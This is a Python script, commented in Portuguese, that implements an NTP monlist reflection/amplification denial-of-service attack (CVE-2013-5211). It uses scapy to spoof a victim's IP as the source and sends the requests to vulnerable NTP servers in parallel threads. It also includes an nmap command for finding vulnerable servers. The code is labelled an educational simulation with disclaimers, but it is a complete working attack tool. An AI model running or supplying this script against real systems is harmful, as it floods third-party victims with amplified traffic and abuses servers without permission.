'''
############################################# DISCLAIMER ##############################################
|   Comando para identificar se seu servidor esta vulneravel:                                         |
|   nmap -sU -pU:123 -Pn -n --script=ntp-monlist <target>                                             |
|   Para mais informações a cerca do DRDoS utilizando o NTP, acesse                                   |
|   https://www.cisa.gov/news-events/alerts/2014/01/13/ntp-amplification-attacks-using-cve-2013-5211  |
|   I am NOT responsible for any damages caused or any crimes committed by using this tool.           |
#######################################################################################################

Bandwidth Amplification Factor - 556.9

'''
from scapy.all import IP, UDP, Raw, send
from concurrent.futures import ThreadPoolExecutor

def simulate_ntp_dr_dos(target_ip, ntp_server, num_packets=10):
    """
    Simula um ataque DRDoS NTP para fins educativos. Não utilize esse script em servidores e redes sem permissão.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param ntp_server: Servidor NTP vulnerável para enviar as solicitações.
    :param num_packets: Número de pacotes a serem enviados.
    """
    # Payload de solicitação para "monlist"
    ntp_monlist_request = b'\x17\x00\x03\x2a' + b'\x00' * 4

    for i in range(num_packets):
        # Construindo o pacote NTP com IP falso (do alvo)
        packet = (
            IP(src=target_ip, dst=ntp_server) /
            UDP(sport=123, dport=123) /
            Raw(load=ntp_monlist_request)
        )
        print(f"[{i+1}/{num_packets}] Enviando pacote para {ntp_server} como se fosse de {target_ip}...")
        send(packet, verbose=0)

def simulate_ntp_dr_dos_multiple(target_ip, ntp_servers, num_packets_per_server=10, num_threads=4):
    """
    Simula um ataque DRDoS NTP contra múltiplos servidores simultaneamente. Não utilize esse script em servidores e redes sem permissão.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param ntp_servers: Lista de servidores NTP vulneráveis para enviar as solicitações.
    :param num_packets_per_server: Número de pacotes a serem enviados por servidor.
    :param num_threads: Número de threads a serem usadas para execução paralela.
    """
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [
            executor.submit(simulate_ntp_dr_dos, target_ip, ntp_server, num_packets_per_server)
            for ntp_server in ntp_servers
        ]
        # Espera todas as threads finalizarem
        for future in futures:
            future.result()

if __name__ == "__main__":
    # Substitua pelos valores que deseja usar para simulação
    TARGET_IP = "192.168.1.1"   # IP da "vítima" (falsificado)
    NTP_SERVERS = ["192.168.1.2","192.168.1.3","192.168.1.4"]  # Lista de servidores NTP vulneráveis
    NUM_PACKETS_PER_SERVER = 1  # Número de pacotes a enviar por servidor
    NUM_THREADS = 10  # Número de threads para paralelismo

    print("Simulando ataque DRDoS NTP...")
    simulate_ntp_dr_dos_multiple(TARGET_IP, NTP_SERVERS, NUM_PACKETS_PER_SERVER, NUM_THREADS)
    print("Simulação concluída.")
